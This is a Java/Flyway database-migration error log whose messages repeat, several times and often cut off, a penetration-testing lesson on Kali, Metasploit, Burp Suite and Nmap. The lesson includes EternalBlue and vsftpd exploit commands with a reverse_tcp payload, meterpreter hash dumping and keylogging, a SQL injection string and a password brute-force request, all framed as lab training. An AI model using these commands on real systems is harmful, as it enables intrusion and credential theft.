WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:52:43.666 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:247)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 1 AND name = 'Penetration Testing Tools Overview'

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:243)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V4__Enhanced_Lesson_Content.sql failed
------------------------------------------------
SQL State  : 22P02
Error Code : 0
Message    : ERROR: invalid input syntax for type boolean: "# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you'll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world's most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
Location   : db/migration/V4__Enhanced_Lesson_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V4__Enhanced_Lesson_Content.sql)
Line       : 210
Statement  : UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
